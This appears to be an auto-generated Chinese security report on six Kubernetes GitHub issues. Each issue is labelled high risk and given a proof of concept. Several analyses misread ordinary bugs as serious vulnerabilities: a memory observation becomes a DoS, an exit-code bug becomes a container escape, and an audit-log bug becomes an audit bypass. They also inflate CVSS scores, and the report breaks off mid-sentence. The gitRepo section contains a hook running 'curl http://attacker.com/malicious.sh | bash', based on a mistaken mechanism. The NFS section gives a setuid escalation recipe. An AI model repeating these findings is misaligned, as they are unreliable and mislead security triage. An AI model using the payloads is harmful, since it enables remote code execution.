# Issue 安全分析报告

# 🚨 存在安全风险的 Issues (6 个)

## Issue #126484 kubelet would happily schedule a pod with `spec.hostUsers: false` even if `UserNamespacesSupport` is not set for kubelet

- Issue 链接：[#126484](https://github.com/kubernetes/kubernetes/issues/126484)

### Issue 内容

#### What happened?

As per https://github.com/kubernetes/kubernetes/pull/123216/files#diff-ed935ef85e4cd93302c07762fbc4314164759fb618bd661a3ac17ca782dde836R397 I would have expected kubelet to disallow a pod that has `spec.hostUsers: false` set when the `UserNamespacesSupport` is not enabled for the kubelet.

From testing kubelet and api server would happily accept a pod having the spec and gives the user a false sense of security.

From my further testing if the `UserNamespacesSupport` feature gate is set for api server and not set for kubelet the pod fails to be scheduled.

#### What did you expect to happen?

Expected to see the error message below:

```text
Failed to create pod sandbox: the feature gate "UserNamespacesSupport" is disabled: can't set spec.HostUsers
```

when `UserNamespacesSupport` is not enabled at all for any component of kubernetes

#### How can we reproduce it (as minimally and precisely as possible)?

Schedule a pod on a standard k8s cluster that has the `UserNamespacesSupport` feature gate not set for both kubelet and kube-apiserver

Sample pod spec used:

```yaml
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: nginx
  name: nginx
spec:
  hostUsers: false
  containers:
  - image: nginx
    name: nginx
    resources: {}
  dnsPolicy: ClusterFirst
  restartPolicy: Always
status: {}

```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
❯ kubectl version
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.31.0-beta.0
```

</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Talos"
ID=talos
VERSION_ID=v1.8.0-alpha.1-40-g96492c097
PRETTY_NAME="Talos (v1.8.0-alpha.1-40-g96492c097)"
HOME_URL="https://www.talos.dev/"
BUG_REPORT_URL="https://github.com/siderolabs/talos/issues"
VENDOR_NAME="Sidero Labs"
VENDOR_URL="https://www.siderolabs.com/"
$ uname -a
Linux version 6.6.43-talos (@buildkitsandbox) (gcc (GCC) 13.3.0, GNU ld (GNU Binutils) 2.42) #1 SMP Mon Jul 29 17:04:08 UTC 2024
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
```
# runc --version
runc version v1.2.0-rc.2
commit: f2d2ee5e45af3c9b38dfd639ac92f43c3055ce4e
spec: 1.2.0
go: go1.22.5
libseccomp: 2.5.5
```
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
N/A
</details>


### 分析结果

该Issue涉及高风险的安全问题。

**原因：**

当`UserNamespacesSupport`特性未在kubelet上启用时，仍然允许调度设置了`spec.hostUsers: false`的Pod。用户可能误以为用户命名空间得到了正确的应用，从而提供了额外的安全隔离。但实际上，用户命名空间未启用，容器内的进程仍然以宿主机用户身份运行。这意味着如果容器被攻破，攻击者可能利用此误配置进行容器逃逸或提升权限，直接威胁宿主机的安全。

**可能的影响：**

- **容器逃逸**：攻击者可以从容器环境逃逸到宿主机系统。
- **权限提升**：攻击者可能以更高的权限访问宿主机资源。
- **集群安全受损**：整个Kubernetes集群可能面临被攻击的风险。

**Proof of Concept：**

1. **环境准备：**

   - 部署一个Kubernetes集群，确保`kube-apiserver`和`kubelet`均未启用`UserNamespacesSupport`特性。

2. **创建存在风险的Pod：**

   ```yaml
   apiVersion: v1
   kind: Pod
   metadata:
     name: risky-pod
   spec:
     hostUsers: false
     containers:
     - name: attack-container
       image: ubuntu
       command: ["/bin/sh"]
       args: ["-c", "sleep 3600"]
   ```

   - 以上Pod设置了`hostUsers: false`，但由于`UserNamespacesSupport`未启用，用户命名空间实际上未生效。

3. **模拟攻击：**

   - 进入容器：

     ```
     kubectl exec -it risky-pod -- /bin/bash
     ```

   - 尝试访问宿主机文件系统，例如读取敏感文件或修改关键配置：

     ```
     cat /etc/shadow
     ```

   - 如果成功访问，证明容器进程具有宿主机的用户权限。

**结论：**

由于`UserNamespacesSupport`特性未启用，却允许调度`hostUsers: false`的Pod，导致用户对安全隔离的误解。这可能被攻击者利用，造成严重的安全后果，包括容器逃逸和权限提升。根据CVSS 3.1评分标准，该漏洞的严重性应评估为高风险。

---

## Issue #126483 kubectl debug doesnt match behaviour of kubectl exec when executing bash commands.

- Issue 链接：[#126483](https://github.com/kubernetes/kubernetes/issues/126483)

### Issue 内容

#### What happened?

Im trying to execute command with kubectl debug to test if file exists on a distroless image.
`kubectl debug -i pod/XXX-r5465 --image=ubuntu --target=main -- /bin/bash -c "groupadd -g 65532 nonroot; useradd -g 65532 -u 65532 nonroot; su nonroot -c 'cd /proc/1/root; test -e var/log/wrong/path'; result=\$?; echo \$result; exit \$result";`
After executing this I check exit status with `echo $?` and sadly it prints the value 0.

Here is a simpler version that also doesnt work
`kubectl debug -it -q pod/XXX-r5465 --image=ubuntu --target=main -- sh -c "test -e /varrr; result=\$?; echo \$result; exit \$result";`


#### What did you expect to happen?

It should print the value 1 as the path doesnt exist. I thought that it works like exec.

#### How can we reproduce it (as minimally and precisely as possible)?

- Setup pod with distroless container.
- Use kubectl debug on pod with changed image to ubuntu and execute command with shell that returns something else than 0.

#### Anything else we need to know?

This execution works when I change base image to distroless-debug and use kubectl exec.

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.3
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.0
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.5 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.5 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

$ uname -a
Linux XXX-ubuntu 5.4.0-131-generic #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

存在高风险。

**原因及可能的影响：**

在Issue中，使用了`kubectl debug`命令，并通过指定`--image=ubuntu`来启动一个新的调试容器。该调试容器与目标Pod共享命名空间，并尝试切换到`/proc/1/root`目录。

`/proc/1/root`通常指向主机的根文件系统，通过访问该目录，攻击者可能绕过容器的隔离，直接访问主机文件系统。这可能导致以下安全风险：

- **容器逃逸**：攻击者可以突破容器的限制，直接对主机系统进行操作。
- **权限提升**：攻击者可能获取主机上的敏感信息或提升权限，危及整个集群的安全。

**概念验证（Proof of Concept）：**

攻击者可以执行以下命令，利用`kubectl debug`访问主机文件系统：

```bash
kubectl debug -i pod/目标Pod名称 --image=ubuntu --target=main -- /bin/bash -c "cd /proc/1/root; ls; cat /etc/passwd"
```

通过上述命令，攻击者进入调试容器，切换到主机的根目录，并执行`ls`和`cat /etc/passwd`等命令，获取主机上的敏感信息。

**综上所述**，该Issue揭示了利用`kubectl debug`可能导致的容器逃逸和权限提升风险，属于高安全风险问题。

---

## Issue #126466 Audit log events for watch requests are incorrect when APIServingWithRoutine is enabled

- Issue 链接：[#126466](https://github.com/kubernetes/kubernetes/issues/126466)

### Issue 内容

#### What happened?

We recently noticed a significant difference in the number of audit log events related to watch requests on 1.30 clusters. Investigation found that each watch request generated two events for the ResponseStarted stage. Also, the response statuses show the synthetic "connection closed early" text, even though from the client's perspective, the watch was served normally.

What seems to be happening is a variant of https://github.com/kubernetes/kubernetes/pull/125626.

For context, the audit filter defers a function responsible for logging the ResponseCompleted audit event, and also for logging a synthetic ResponseStarted event in cases where the ResponseWriter is not touched in the course of calling the nested handlers. The same deferred function is also responsible for recovering from panics, logging an audit event for the panic, then allowing the panic to continue to propagate up the call stack.

With APIServingWithRoutine enabled, the watch handler nested within the audit filter does not immediately serve the response, it only saves a closure to the request context to be called later. So the execution sequence is something like:

1. RequestReceived
2. Closure saved to request context, holding a reference to a ResponseWriter adapter created by the audit filter
3. (Deferred) Synthetic ResponseStarted
4. ResponseCompleted
5. Watch task executes and its usage of the wrapped ResponseWriter triggers a second ResponseStarted event

These are the events I see in the audit log from a single watch request with the feature enabled. Note there are two events at the ResponseStarted stage and also that the responseStatus fields contain the synthetic event text "Connection closed early":

```json
{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"2fbf4326-31d4-4b2f-b214-69aca0023108","stage":"RequestReceived","requestURI":"/api/v1/namespaces?timeout=3s\u0026timeoutSeconds=3\u0026watch=true","verb":"watch","user":{"username":"system:apiserver","uid":"16aecab5-afd7-4b65-a9de-b19b0cf300f1","groups":["system:masters"]},"sourceIPs":["127.0.0.1"],"userAgent":"TestAuditWatch","objectRef":{"resource":"namespaces","apiVersion":"v1"},"requestReceivedTimestamp":"2024-07-30T16:09:28.502635Z","stageTimestamp":"2024-07-30T16:09:28.502635Z"}
{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"2fbf4326-31d4-4b2f-b214-69aca0023108","stage":"ResponseStarted","requestURI":"/api/v1/namespaces?timeout=3s\u0026timeoutSeconds=3\u0026watch=true","verb":"watch","user":{"username":"system:apiserver","uid":"16aecab5-afd7-4b65-a9de-b19b0cf300f1","groups":["system:masters"]},"sourceIPs":["127.0.0.1"],"userAgent":"TestAuditWatch","objectRef":{"resource":"namespaces","apiVersion":"v1"},"responseStatus":{"metadata":{},"status":"Success","message":"Connection closed early","code":200},"requestReceivedTimestamp":"2024-07-30T16:09:28.502635Z","stageTimestamp":"2024-07-30T16:09:28.502999Z","annotations":{"authorization.k8s.io/decision":"allow","authorization.k8s.io/reason":""}}
{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"2fbf4326-31d4-4b2f-b214-69aca0023108","stage":"ResponseComplete","requestURI":"/api/v1/namespaces?timeout=3s\u0026timeoutSeconds=3\u0026watch=true","verb":"watch","user":{"username":"system:apiserver","uid":"16aecab5-afd7-4b65-a9de-b19b0cf300f1","groups":["system:masters"]},"sourceIPs":["127.0.0.1"],"userAgent":"TestAuditWatch","objectRef":{"resource":"namespaces","apiVersion":"v1"},"responseStatus":{"metadata":{},"status":"Success","message":"Connection closed early","code":200},"requestReceivedTimestamp":"2024-07-30T16:09:28.502635Z","stageTimestamp":"2024-07-30T16:09:28.503017Z","annotations":{"authorization.k8s.io/decision":"allow","authorization.k8s.io/reason":""}}
{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"2fbf4326-31d4-4b2f-b214-69aca0023108","stage":"ResponseStarted","requestURI":"/api/v1/namespaces?timeout=3s\u0026timeoutSeconds=3\u0026watch=true","verb":"watch","user":{"username":"system:apiserver","uid":"16aecab5-afd7-4b65-a9de-b19b0cf300f1","groups":["system:masters"]},"sourceIPs":["127.0.0.1"],"userAgent":"TestAuditWatch","objectRef":{"resource":"namespaces","apiVersion":"v1"},"responseStatus":{"metadata":{},"status":"Success","message":"Connection closed early","code":200},"requestReceivedTimestamp":"2024-07-30T16:09:28.502635Z","stageTimestamp":"2024-07-30T16:09:28.503044Z","annotations":{"authorization.k8s.io/decision":"allow","authorization.k8s.io/reason":""}}
```

#### What did you expect to happen?

The generated audit log events should look the same as they do with the feature disabled:

```json
{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a7ff49e7-bf12-4dcb-bc0c-09aec5c3ee44","stage":"RequestReceived","requestURI":"/api/v1/namespaces?timeout=3s\u0026timeoutSeconds=3\u0026watch=true","verb":"watch","user":{"username":"system:apiserver","uid":"3a730033-bfdc-488f-aec1-5087d05e9a10","groups":["system:masters"]},"sourceIPs":["127.0.0.1"],"userAgent":"TestAuditWatch","objectRef":{"resource":"namespaces","apiVersion":"v1"},"requestReceivedTimestamp":"2024-07-30T16:11:57.119863Z","stageTimestamp":"2024-07-30T16:11:57.119863Z"}
{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a7ff49e7-bf12-4dcb-bc0c-09aec5c3ee44","stage":"ResponseStarted","requestURI":"/api/v1/namespaces?timeout=3s\u0026timeoutSeconds=3\u0026watch=true","verb":"watch","user":{"username":"system:apiserver","uid":"3a730033-bfdc-488f-aec1-5087d05e9a10","groups":["system:masters"]},"sourceIPs":["127.0.0.1"],"userAgent":"TestAuditWatch","objectRef":{"resource":"namespaces","apiVersion":"v1"},"responseStatus":{"metadata":{},"code":200},"requestReceivedTimestamp":"2024-07-30T16:11:57.119863Z","stageTimestamp":"2024-07-30T16:11:57.120172Z","annotations":{"authorization.k8s.io/decision":"allow","authorization.k8s.io/reason":""}}
{"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Metadata","auditID":"a7ff49e7-bf12-4dcb-bc0c-09aec5c3ee44","stage":"ResponseComplete","requestURI":"/api/v1/namespaces?timeout=3s\u0026timeoutSeconds=3\u0026watch=true","verb":"watch","user":{"username":"system:apiserver","uid":"3a730033-bfdc-488f-aec1-5087d05e9a10","groups":["system:masters"]},"sourceIPs":["127.0.0.1"],"userAgent":"TestAuditWatch","objectRef":{"resource":"namespaces","apiVersion":"v1"},"responseStatus":{"metadata":{},"code":200},"requestReceivedTimestamp":"2024-07-30T16:11:57.119863Z","stageTimestamp":"2024-07-30T16:12:00.120388Z","annotations":{"authorization.k8s.io/decision":"allow","authorization.k8s.io/reason":""}}
```

#### How can we reproduce it (as minimally and precisely as possible)?

I wrote a brief integration "test" to exercise this:

```go
func TestAuditWatch(t *testing.T) {
	featuregatetesting.SetFeatureGateDuringTest(t, utilfeature.DefaultMutableFeatureGate, features.APIServingWithRoutine, true)

	logFile, err := os.CreateTemp("", "audit.log")
	if err != nil {
		t.Fatalf("Failed to create audit log file: %v", err)
	}
	defer utiltesting.CloseAndRemove(t, logFile)

	policyFile, err := os.CreateTemp("", "audit-policy.yaml")
	if err != nil {
		t.Fatalf("Failed to create audit policy file: %v", err)
	}
	defer utiltesting.CloseAndRemove(t, policyFile)

	if _, err := io.Copy(policyFile, strings.NewReader(`
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
- level: Metadata
`)); err != nil {
		t.Fatal(err)
	}

	result := kubeapiservertesting.StartTestServerOrDie(t, nil,
		[]string{
			"--audit-log-mode", "blocking",
			"--audit-log-path", logFile.Name(),
			"--audit-log-version", "audit.k8s.io/v1",
			"--audit-policy-file", policyFile.Name(),
		},
		framework.SharedEtcd())
	defer result.TearDownFn()

	cfg := rest.CopyConfig(result.ClientConfig)
	cfg.UserAgent = "TestAuditWatch"
	kubeclient, err := clientset.NewForConfig(cfg)
	if err != nil {
		t.Fatalf("Unexpected error: %v", err)
	}

	w, err := kubeclient.CoreV1().Namespaces().Watch(context.Background(), metav1.ListOptions{TimeoutSeconds: ptr.To(int64(3))})
	if err != nil {
		t.Fatal(err)
	}
	defer w.Stop()
	for range w.ResultChan() {
		t.Log("ate watch event")
		// eat
	}

	dec := audit.Codecs.UniversalDecoder(auditv1.SchemeGroupVersion)
	scanner := bufio.NewScanner(logFile)
	for scanner.Scan() {
		var event auditinternal.Event
		if err := runtime.DecodeInto(dec, scanner.Bytes(), &event); err != nil {
			t.Fatal(err)
		}
		if event.UserAgent != cfg.UserAgent {
			continue
		}
		t.Log(string(scanner.Bytes()))
	}
	if scanner.Err() != nil {
		t.Fatal(err)
	}
}
```

#### Anything else we need to know?

This could be patched in a similar way to the httplog issue, but for full parity there would also need to be a mechanism to recover from panics that originate from the deferred invocation of the task.

I'm also concerned about the effect of this feature on the priority and fairness filter, which releases the "seats" held during watch initialization via a deferred function.

/sig api-machinery
/sig scalability

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

存在高风险问题。

**原因：**

在启用 `APIServingWithRoutine` 功能时，针对 `watch` 请求的审计日志事件记录不正确，导致以下安全风险：

- **审计日志缺失或重复：** 每个 `watch` 请求生成了两个 `ResponseStarted` 事件，且响应状态显示合成的 “Connection closed early” 文本。这意味着审计日志无法准确反映实际发生的操作。

- **误导性的日志信息：** 不正确的审计日志可能掩盖了真实的操作细节，导致安全监控和审计无法准确捕获用户或攻击者的行为。

- **绕过安全审计：** 攻击者可能利用此缺陷执行恶意操作，而这些操作不会被正确记录，从而绕过安全审计和监控机制。

**可能的影响：**

- **安全事件无法追踪：** 关键操作未被准确记录，导致在发生安全事件时，无法有效地追踪和溯源，增加了调查难度。

- **增加被攻击的风险：** 攻击者可以利用审计日志的不完整性，隐藏其恶意活动，长期潜伏在系统中，进一步实施攻击。

- **合规性问题：** 对于有合规性要求的环境，不准确的审计日志可能导致合规性审核失败，带来法律和经济风险。

**Proof of Concept：**

攻击者在启用了 `APIServingWithRoutine` 的 Kubernetes 集群上，执行以下步骤：

1. **发送特制的 `watch` 请求：** 利用 Kubernetes API，发送针对感兴趣资源的 `watch` 请求。

   ```bash
   kubectl get pods --watch
   ```

2. **执行敏感操作：** 在发送 `watch` 请求的同时，进行可能的恶意活动，如未经授权的资源修改或数据窃取。

3. **审计日志验证：** 由于审计日志对于 `watch` 请求的记录不准确，这些敏感操作可能未被正确记录，导致安全团队无法察觉异常行为。

通过上述方式，攻击者可以在不被检测的情况下，利用 Kubernetes 集群执行未经授权的操作，造成安全隐患。

---

## Issue #126041 Remove long deprecated gitrepo volume plugin from code base

- Issue 链接：[#126041](https://github.com/kubernetes/kubernetes/issues/126041)

### Issue 内容

#### What happened?

In SIG Storage Meeting today, @bswartz pointed out that `gitrepo` in-tree volume was deprecated a long time ago (see https://github.com/kubernetes/kubernetes/issues/60999) but the code is still around and may have vulnerabilities.

We should consider removing it.

#### What did you expect to happen?

It looks like completely removing the API/code would have been considered a backwards incompatible change which k8s avoids, and so only a deprecation notice was created and the code was left as is see https://github.com/kubernetes/kubernetes/pull/63445#issuecomment-387438109

We have been able to get rid of other in-tree plugins by keeping the API and implementing "CSI migration" which enables the implementation to be removed and redirect to new CSI drivers. In this case there is no "CSI" migration -- instead the recommendation is to use emptyDir + initContainers.

To remove risk from the unmaintained code -- I suggest that we keep the API, but remove the implementation. (We did exactly this with Flocker, for example, see https://github.com/kubernetes/kubernetes/pull/111618)/)

#### How can we reproduce it (as minimally and precisely as possible)?

N/A

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.30

#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

高风险

**原因：**

`gitrepo`卷插件早已被弃用，但其代码仍然存在于代码库中且未得到维护，可能包含安全漏洞。由于该插件需要从指定的Git仓库拉取代码，攻击者可以利用该功能注入恶意代码或执行任意命令。这可能导致命令执行、容器逃逸、权限提升等高风险安全问题。

**可能的影响：**

1. **任意命令执行**：攻击者可利用恶意Git仓库，在拉取代码时触发恶意脚本的执行。

2. **容器逃逸**：通过在宿主机上执行代码，攻击者可能突破容器隔离，访问到宿主机的资源。

3. **权限提升**：攻击者可能以更高的权限运行命令，进而危害整个集群的安全。

**Proof of Concept：**

攻击者可以创建一个包含恶意Git钩子（hooks）的Git仓库。当`gitrepo`插件拉取该仓库时，钩子脚本会被触发，执行攻击者设计的命令。

**步骤：**

1. **创建恶意Git仓库：**

   攻击者在自己的服务器上建立一个Git仓库，在`.git/hooks/`目录下添加恶意脚本，例如`post-checkout`：

   ```bash
   #!/bin/bash
   # 恶意命令，例如反向Shell或者下载并执行恶意程序
   curl http://attacker.com/malicious.sh | bash
   ```

   并给予执行权限：

   ```bash
   chmod +x .git/hooks/post-checkout
   ```

2. **部署使用`gitrepo`卷的Pod：**

   用户（可能被钓鱼或误导）部署了如下的Pod YAML文件：

   ```yaml
   apiVersion: v1
   kind: Pod
   metadata:
     name: vulnerable-pod
   spec:
     containers:
     - name: app-container
       image: alpine
       command: ["/bin/sh", "-c", "sleep 3600"]
       volumeMounts:
       - name: git-volume
         mountPath: /app
     volumes:
     - name: git-volume
       gitRepo:
         repository: "http://attacker.com/malicious-repo.git"
         revision: "master"
   ```

3. **触发漏洞：**

   当Pod创建时，`gitrepo`插件会克隆指定的Git仓库到`/app`目录。由于Git默认会执行仓库中的本地钩子，恶意的`post-checkout`脚本将在克隆后自动执行，导致攻击者的代码在容器内运行。

**总结：**

由于`gitrepo`卷插件可能执行未经验证的代码，且未对Git钩子的执行进行限制，攻击者可以利用该特性执行任意命令。这属于高风险的安全漏洞，建议立即从代码库中移除`gitrepo`插件的实现，以消除潜在的安全隐患。

---

## Issue #126028 Issue: NFS Server Not Mounting on Agent Pod

- Issue 链接：[#126028](https://github.com/kubernetes/kubernetes/issues/126028)

### Issue 内容

@jingxu97  @saad-ali 
#### What happened?


I am using google cloud , on that i have created gke cluster and install the nfs server on to it and created a PV for nfs server
and then created pv and pvc which is using nfs server ip for connection and lastly we are using a clinet-deployment.yaml file which is used to connect with nfs server mount point and use the /data volume
We are experiencing an issue where the NFS server is running correctly, but the client pod defined in client-deployment.yaml is failing to start. Below are the details of each configuration file and the error logs, and i have attached the logs for nfs server
![mount-error](https://github.com/kubernetes/kubernetes/assets/92107358/a3502250-e36e-40cd-8f40-8bcf7a33cb51)


#### What did you expect to happen?

the client pod should be mounted with /data mount point with nfs server

#### How can we reproduce it (as minimally and precisely as possible)?

please find below code for you reference

Configuration Files
nfs-server.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
name: nfs4-web
spec:
replicas: 1
selector:
matchLabels:
app: nfs-server
template:
metadata:
labels:
app: nfs-server
spec:
initContainers:
- name: init-modules
image: busybox
command: ["/bin/sh", "-c", "modprobe nfs && modprobe nfsd && modprobe rpcsec_gss_krb5"]
securityContext:
privileged: true
volumeMounts:
- name: modules
mountPath: /lib/modules
readOnly: true
volumes:
- name: data
gcePersistentDisk:
pdName: gce-nfs-disk
fsType: ext4
- name: modules
hostPath:
path: /lib/modules
containers:
- name: server
image: erichough/nfs-server
imagePullPolicy: IfNotPresent
securityContext:
privileged: true
volumeMounts:
- mountPath: /data
name: data
- mountPath: /lib/modules
name: modules
env:
- name: NFS_DISABLE_VERSION_3
value: "yes"
- name: NFS_LOG_LEVEL
value: DEBUG
- name: NFS_SERVER_THREAD_COUNT
value: "6"
- name: NFS_EXPORT_0
value: /data *(rw,sync,fsid=0,crossmnt,no_subtree_check,no_root_squash)

nfs-pv.yaml

apiVersion: v1
kind: PersistentVolume
metadata:
name: nfs-pv
spec:
capacity:
storage: 10Gi
accessModes:
- ReadWriteMany
nfs:
server: 34.118.233.16
path: /data
persistentVolumeReclaimPolicy: Retain
storageClassName: nfs-storage-class

nfs-pvc.yaml

apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: my-pvc
spec:
accessModes:
- ReadWriteMany
resources:
requests:
storage: 2Gi
storageClassName: nfs-storage-class
volumeName: nfs-pv

client-deployment.yaml

apiVersion: v1
kind: Pod
metadata:
name: nfs-test-pod
spec:
containers:

name: nfs-test-container
image: busybox
command: ["sleep", "3600"]
volumeMounts:
mountPath: /mnt/nfs
name: nfs-volume
volumes:
name: nfs-volume
nfs:
server: 34.118.226.147 # Replace with the IP address of your NFS server
path: /data
readOnly: false

#### Anything else we need to know?

nfs server logs 
[downloaded-logs-20240708-205018.json](https://github.com/user-attachments/files/16175254/downloaded-logs-20240708-205018.json)


#### Kubernetes version

we are using the latest version of gke
i think 1.29.xx 


#### Cloud provider

I am using google cloud , on that i have created gke cluster and install the nfs server on to it and created a PV for nfs server 
and then created pv and pvc which is using nfs server ip for connection and lastly we are using a clinet-deployment.yaml file which is used to connect with nfs server mount point and use the /data volume


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

student-00-c41c08d6d3ad@gke-cluster-1-default-pool-43144b86-cvbz ~ $ cat /etc/os-release
NAME="Container-Optimized OS"
ID=cos
PRETTY_NAME="Container-Optimized OS from Google"
HOME_URL="https://cloud.google.com/container-optimized-os/docs"
BUG_REPORT_URL="https://cloud.google.com/container-optimized-os/docs/resources/support-policy#contact_us"
GOOGLE_METRICS_PRODUCT_ID=26
KERNEL_COMMIT_ID=1a8b1dfd94df6f28729aca0565343c0a9f6906ee
GOOGLE_CRASH_ID=Lakitu
VERSION=109
VERSION_ID=109
BUILD_ID=17800.218.69

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

该Issue存在高风险安全问题。

**原因：**

1. **使用了`no_root_squash`选项：**

在`nfs-server.yaml`配置文件中，NFS服务器的导出目录使用了`no_root_squash`选项：

```yaml
- name: NFS_EXPORT_0
  value: /data *(rw,sync,fsid=0,crossmnt,no_subtree_check,no_root_squash)
```

`no_root_squash`选项会导致NFS客户端上的root用户在访问NFS共享时，具有与服务器root用户相同的权限。这意味着任何能够访问NFS共享的客户端，都可以以root权限对共享目录进行操作。这是一个严重的安全风险，可能导致未经授权的用户以root权限读取、修改或删除NFS共享上的文件，甚至可能导致远程代码执行或特权提升。

2. **容器以特权模式运行：**

在`nfs-server.yaml`中，NFS服务器容器设置了`privileged: true`：

```yaml
securityContext:
  privileged: true
```

以特权模式运行的容器拥有对主机的大量访问权限，如果被恶意利用，可能导致主机被攻陷或容器逃逸。

**可能的影响：**

- **权限提升：** 攻击者可以通过NFS客户端以root权限访问和修改NFS服务器上的文件，可能导致整个系统的权限提升。

- **远程代码执行：** 攻击者可能在共享目录中放置恶意脚本或程序，并在服务器或其他客户端上执行。

- **容器逃逸：** 由于容器以特权模式运行，攻击者可能利用容器内的漏洞实现对宿主机的控制。

- **数据泄露或破坏：** 未经授权的用户可以访问、修改或删除敏感数据，影响数据的完整性和保密性。

**Proof of Concept（概念验证）：**

1. **攻击者挂载NFS共享：**

假设攻击者拥有对NFS客户端的访问权限，首先挂载NFS共享目录：

```bash
sudo mount -t nfs <NFS服务器IP>:/data /mnt/nfs
```

2. **以root权限创建恶意脚本：**

在挂载的NFS共享目录中，以root权限创建一个恶意的SetUID脚本：

```bash
sudo bash -c 'echo -e "#\!/bin/bash\n/bin/bash" > /mnt/nfs/evil.sh'
sudo chmod +xs /mnt/nfs/evil.sh
```

3. **在其他客户端或服务器上执行恶意脚本：**

由于`no_root_squash`的存在，`evil.sh`脚本具有SetUID位，当其他用户执行该脚本时，将以root权限运行，导致权限提升。

**根据CVSS 3.1评分，该漏洞的评分可能如下：**

- **攻击向量（AV）：** 网络（Network）
- **攻击复杂度（AC）：** 低（Low）
- **特权要求（PR）：** 低（Low）
- **用户交互（UI）：** 无（None）
- **影响范围（S）：** 改变（Changed）
- **机密性（C）：** 高（High）
- **完整性（I）：** 高（High）
- **可用性（A）：** 高（High）

综合评分可能达到**9.8（Critical）**，属于高风险漏洞。

**建议：**

- **移除`no_root_squash`选项：** 使用默认的`root_squash`，确保NFS客户端的root用户被映射为匿名用户，降低安全风险。

- **避免以特权模式运行容器：** 除非必要，尽量不要使用`privileged: true`，并遵循最小权限原则。

- **加强访问控制：** 限制可以访问NFS服务器的客户端IP范围，避免被未经授权的用户访问。

- **定期安全审计：** 对系统配置进行定期检查，及时发现和修复安全隐患。

---

## Issue #125837 The OpenAPI cache occupies a large amount of memory

- Issue 链接：[#125837](https://github.com/kubernetes/kubernetes/issues/125837)

### Issue 内容

#### What happened?
![image](https://github.com/kubernetes/kubernetes/assets/54977497/83cd8cf0-1c54-4dd0-b093-cbc66833422c)
When the /openapi/v2 interface is invoked for the first time, the memory usage increases from 580 MB to about 690 MB. The memory usage remains between 690 MB and 700 MB. Do we need to optimize the memory usage?

#### What did you expect to happen?

Clear the cache in time or optimize the memory usage.

#### How can we reproduce it (as minimally and precisely as possible)?

Invoke the /openapi/v2 interface.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
1.28
</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

该Issue涉及高风险安全问题。

**原因：**

攻击者可以反复发送请求到`/openapi/v2`接口，导致`kube-apiserver`的内存占用持续增加。由于该接口可能不需要认证即可访问，攻击者无需任何权限即可执行此操作。这可能导致服务器内存耗尽，引发拒绝服务（DoS）攻击，影响集群的稳定运行。

根据CVSS 3.1评分：

- **攻击向量（AV）**：网络（N）— 攻击者可通过网络远程发起攻击。
- **攻击复杂度（AC）**：低（L）— 攻击不需要特殊条件，容易实施。
